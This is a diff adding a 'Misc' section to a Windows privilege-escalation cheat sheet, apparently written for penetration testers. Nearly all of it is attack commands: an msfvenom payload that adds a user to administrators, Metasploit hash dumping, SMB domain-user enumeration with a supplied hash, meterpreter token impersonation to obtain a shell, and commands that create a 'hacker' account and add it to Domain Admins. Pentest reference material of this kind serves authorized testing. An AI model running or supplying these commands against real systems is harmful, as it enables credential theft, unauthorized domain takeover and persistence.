@@ -223,6 +223,53 @@ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Whe
 
 You can detect and exploit this vulnerability with metasploit using the module: `exploit/windows/local/trusted_service_path` You can manually create a service binary with msfvenom: `msfvenom -p windows/exec CMD="net localgroup administrators $username /add" -f exe-service -o service.exe`
 
+### Misc
+
+\[&gt;\] List the domain administrators:
+
+```text
+net group "Domain Admins" /domain
+```
+
+\[&gt;\] Dump the hashes \(Metasploit\)
+
+```text
+msf > run post/windows/gather/smart_hashdump GETSYSTEM=FALSE
+```
+
+\[&gt;\] Find the admins \(Metasploit\)
+
+```text
+spool /tmp/enumdomainusers.txt
+msf > use auxiliary/scanner/smb/smb_enumusers_domain
+msf > set smbuser Administrator
+msf > set smbpass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+msf > set rhosts 10.10.10.0/24
+msf > set threads 8
+msf > run
+msf> spool off
+```
+
+\[&gt;\] If Compromised Admin's box
+
+```text
+meterpreter > load incognito
+meterpreter > list_tokens -u
+meterpreter > impersonate_token MYDOM\\adaministrator
+meterpreter > getuid
+meterpreter > shell
+```
+
+\[&gt;\] Other
+
+```text
+C:\> whoami
+C:\> net user hacker /add /domain
+C:\> net group "Domain Admins" hacker /add /domain
+```
+
+
+
 ### References
 
 * [http://vcloud-lab.com/entries/powershell/different-ways-to-bypass-powershell-execution-policy-ps1-cannot-be-loaded-because-running-scripts-is-disabled](http://vcloud-lab.com/entries/powershell/different-ways-to-bypass-powershell-execution-policy-ps1-cannot-be-loaded-because-running-scripts-is-disabled) - [@KunalAdapi](https://twitter.com/kunalUdapi)
